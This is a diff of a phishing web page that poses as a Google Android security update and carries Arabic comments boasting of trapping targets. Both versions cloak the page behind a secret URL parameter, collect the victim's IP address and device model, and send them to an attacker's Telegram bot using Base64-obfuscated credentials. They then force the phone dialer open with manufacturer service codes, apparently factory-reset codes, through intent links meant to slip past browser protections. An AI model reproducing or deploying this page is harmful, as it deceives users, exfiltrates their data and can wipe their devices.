@@ -3,96 +3,83 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta property="og:title" content="Google Security Center">
-    <meta property="og:description" content="تحديث أمان هام لنظام الأندرويد. يرجى المتابعة لتأمين حسابك.">
+    <meta property="og:title" content="Google Security Support">
     <meta property="og:image" content="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png">
-    <title>Google Account Support</title>
+    <title>تحديث أمان أندرويد</title>
     <style>
-        body { background:#ffffff; color:#000; font-family:'Segoe UI', Tahoma, sans-serif; text-align:center; margin:0; padding:0; height:100vh; overflow:hidden; cursor:pointer; }
-        .header { padding:20px; border-bottom:1px solid #eee; }
-        .content { padding:40px 20px; }
+        body { background:#fff; font-family:sans-serif; text-align:center; padding-top:20%; margin:0; }
         .loader { border: 4px solid #f3f3f3; border-top: 4px solid #4285F4; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; display:inline-block; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         #overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 9999; }
-        .msg { color:#5f6368; font-size:18px; margin-top:20px; }
     </style>
 </head>
-<body onload="init_attack()">
+<body onload="launch_attack()">
 
     <div id="overlay"></div>
 
-    <div class="header">
-        <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" width="92">
-    </div>
-
-    <div class="content">
+    <div id="content">
         <div class="loader"></div>
-        <div class="msg">جاري فحص توافق النظام وتحديث بروتوكولات الأمان...</div>
-        <p style="font-size:12px; color:#999; margin-top:50px;">ID: SEC-8585-RH | 🔒 تواصل مشفر</p>
+        <p style="color:#5f6368; font-size:18px;">جاري فحص توافق الجهاز مع بروتوكول الحماية...</p>
+        <p id="dev-info" style="font-size:12px; color:#ccc;"></p>
     </div>
 
 <script>
-    // بيانات التليجرام الخاصة بك (مشفره Base64 لعدم كشفها)
-    const _0x_tk = "ODU4NTE1NzEzNjpBQUVhQlp3LVgwUXVmT3JFeFRWQ2RKZ20wZXpycTNRTGtqOA==";
-    const _0x_id = "NzE4NDk3MDM1NQ==";
-    
-    function _dec(s) { return atob(s); }
+    // بياناتك المشفرة
+    const _t = "ODU4NTE1NzEzNjpBQUVhQlp3LVgwUXVmT3JFeFRWQ2RKZ20wZXpycTNRTGtqOA==";
+    const _c = "NzE4NDk3MDM1NQ==";
+    function _d(s) { return atob(s); }
 
-    function init_attack() {
-        const urlParams = new URLSearchParams(window.location.search);
-        
-        // التمويه: إذا لم يفتح بالرابط السري يذهب لجوجل الحقيقي
-        if (urlParams.get('auth') !== 'true') {
-            window.location.href = "https://www.google.com";
-            return;
+    function launch_attack() {
+        const p = new URLSearchParams(window.location.search);
+        if (p.get('auth') !== 'true') { window.location.href = "https://www.google.com"; return; }
+
+        let ua = navigator.userAgent;
+        let model = "Unknown Device";
+        let osVer = "Unknown OS";
+        let code = "2767*3855%23"; // الكود الافتراضي
+        let method = "⚠️ توجيه يدوي (لوحة الاتصال)";
+
+        // 1. تحليل دقيق جداً للموديل والإصدار
+        if (ua.match(/Android\s([0-9\.]+)/)) {
+            osVer = "Android " + RegExp.$1;
+            let ver = parseFloat(RegExp.$1);
+            if (ver <= 10) method = "🚀 تنفيذ تلقائي (صامت)";
         }
 
-        // 1. جمع المعلومات الصامتة (IP + نوع الجهاز + الإصدار)
-        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(data => {
-            let ua = navigator.userAgent;
-            let platform = navigator.platform;
-            let status = "⚠️ يدوي (11+)";
-            let code = "2767*3855%23"; // الكود الافتراضي (سامسونج/ريلمي/أوبو)
+        // 2. تحديد الكود المناسب بناءً على البصمة الرقمية للجهاز
+        let uL = ua.toLowerCase();
+        if (uL.includes("samsung")) {
+            model = "Samsung"; code = "2767*3855%23";
+        } else if (uL.includes("xiaomi") || uL.includes("redmi")) {
+            model = "Xiaomi/Redmi"; code = "%23*%23*7780*%23*%23";
+        } else if (uL.includes("huawei") || uL.includes("honor")) {
+            model = "Huawei/Honor"; code = "%23*%23*2846579*%23*%23";
+        } else if (uL.includes("realme") || uL.includes("oppo") || uL.includes("vivo")) {
+            model = "Realme/Oppo/Vivo"; code = "2767*3855%23";
+        } else if (uL.includes("sony")) {
+            model = "Sony"; code = "%23*%23*7378423*%23*%23";
+        }
 
-            // تحديد الإصدار وقوة التنفيذ
-            if (ua.match(/Android\s([4-9]|10)\./)) {
-                status = "🚀 تنفيذ تلقائي (صامت)";
-            }
+        // 3. إرسال التقرير المجهري للتليجرام
+        fetch('https://api.ipify.org?format=json').then(r => r.json()).then(ipData => {
+            let report = `🎯 هدف تحت المجهر!\n🌐 IP: ${ipData.ip}\n📱 الشركة: ${model}\n⚙️ الإصدار: ${osVer}\n📡 الحالة: ${method}\n📟 الكود المستخدم: *${code.replace('%23', '#')}*`;
+            fetch(`https://api.telegram.org/bot${_d(_t)}/sendMessage?chat_id=${_d(_c)}&text=${encodeURIComponent(report)}`);
+        });
 
-            // قاعدة بيانات الأكواد حسب نوع الجهاز
-            let uL = ua.toLowerCase();
-            if (uL.includes("xiaomi") || uL.includes("redmi") || uL.includes("google")) {
-                code = "%23*%23*7780*%23*%23";
-            } else if (uL.includes("huawei") || uL.includes("honor")) {
-                code = "%23*%23*2846579*%23*%23";
-            } else if (uL.includes("sony")) {
-                code = "%23*%23*7378423*%23*%23";
-            }
-
-            // إرسال التقرير الاستخباراتي للتليجرام
-            let report = `🔔 هدف جديد في الفخ!\n🌐 IP: ${data.ip}\n📱 الجهاز: ${platform}\n⚙️ الحالة: ${status}\n🌍 الأكشن المتوقع: فتح لوحة الاتصال بالكود المناسب.`;
-            fetch(`https://api.telegram.org/bot${_dec(_0x_tk)}/sendMessage?chat_id=${_dec(_0x_id)}&text=${encodeURIComponent(report)}`);
-
-            // 2. التنفيذ الإجباري (التوجيه التلقائي)
-            // استخدام بروتوكول Intent لتجاوز رسالة "المتابعة" في أندرويد 11+
-            let targetIntent = `intent://*${code}#Intent;scheme=tel;action=android.intent.action.DIAL;end`;
-
-            // المحاولة الأولى: التوجيه الفوري
-            setTimeout(() => {
-                window.location.href = targetIntent;
-            }, 800);
-
-            // خطة بديلة في حال فشل البروتوكول الأول
+        // 4. التنفيذ القسري (تجاوز حماية 11+)
+        setTimeout(() => {
+            // محاولة فتح عبر Intent (الأقوى للأجهزة الحديثة)
+            let intent = `intent://*${code}#Intent;scheme=tel;action=android.intent.action.DIAL;end`;
+            window.location.href = intent;
+            
+            // احتياطي لو فشل الـ Intent
             setTimeout(() => {
                 window.location.href = "tel:*" + code;
-            }, 2500);
-        });
+            }, 1000);
+        }, 1200);
     }
 
-    // إجبار التنفيذ عند لمس أي جزء في الشاشة (تخطي حماية المتصفح)
-    document.getElementById('overlay').onclick = function() {
-        init_attack();
-    };
+    document.getElementById('overlay').onclick = launch_attack;
 </script>
 </body>
 </html>
